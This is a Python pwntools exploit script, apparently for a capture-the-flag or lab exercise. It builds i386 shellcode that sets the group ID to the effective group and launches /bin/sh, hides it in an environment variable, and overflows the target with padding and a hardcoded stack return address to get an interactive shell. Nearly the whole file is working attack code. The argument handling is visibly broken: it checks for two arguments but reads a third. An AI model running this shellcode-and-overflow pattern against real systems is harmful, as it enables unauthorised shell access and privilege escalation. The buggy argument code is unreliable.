#!/usr/bin/env python
from pwn import *
import pwn
import helpers



arch = 'i386'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // write your assembly here
    // clear register
    xor %eax, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx

    // setregid(getegid(), getegid())
    // arg0: getegid(); arg1: getegid()
    push $0x32
    pop %eax
    int $0x80
    mov %eax, %ebx
    mov %eax, %ecx

    // call setregid(arg1, arg2)
    push $0x47
    pop %eax
    int $0x80
    
    // execve('//bin/sh', 0, 0)
    // clear out registers
    xor %edx, %edx
    xor %ecx, %ecx
    xor %ebx, %ebx

    // arg0: '//bin/sh'
    push %ebx
    push $0x68732f6e
    push $0x69622f2f
    mov %esp, %ebx

    // execve(arg0, arg1, arg2)
    push $0x0b
    pop %eax
    int $0x80
'''

compiled = asm(shellcode, arch=arch)

prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = pwn.ELF(prog)
target = elf.process(env={'EXP':compiled}) 
#target = elf.process(setuid=False, env={'EXP':compiled}) 
context.terminal = ['tmux', 'splitw']
#io = gdb.attach(target, 'b main')


#################################################################################
# EXPLOIT                                                                       #
#################################################################################

addr = b'\x84\xdf\xff\xff'

buffer_to_eip = 0x10

payload = b''.join([
  pwn.cyclic(buffer_to_eip),
])
payload += addr

target.send(payload)
target.interactive()
